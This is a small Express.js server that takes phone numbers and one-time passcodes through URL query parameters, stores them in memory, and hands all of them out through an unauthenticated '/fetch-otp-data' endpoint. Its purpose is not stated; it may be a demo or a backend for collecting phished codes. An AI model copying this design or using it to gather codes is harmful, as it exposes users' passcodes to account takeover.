const express = require('express');
const path = require('path'); // To serve static files
const app = express();

// Array to store phone numbers and OTPs
const otpData = [];

// Serve the static HTML page
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to receive phone and OTP
app.get('/', (req, res) => {
    const phone = req.query.phone;
    const otp = req.query.otp;

    if (!phone || !otp) {
        return res.status(400).json({
            message: 'Phone number and OTP are required',
            status: 'error',
        });
    }

    // Store the phone and OTP in the array
    otpData.push({ phone, otp });

    res.status(200).json({
        message: `OTP ${otp} received for phone ${phone}`,
        status: 'success',
    });
});

// Endpoint to fetch all OTP data
app.get('/fetch-otp-data', (req, res) => {
    res.setHeader('Cache-Control', 'no-store'); // Disable caching
    res.json(otpData);
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
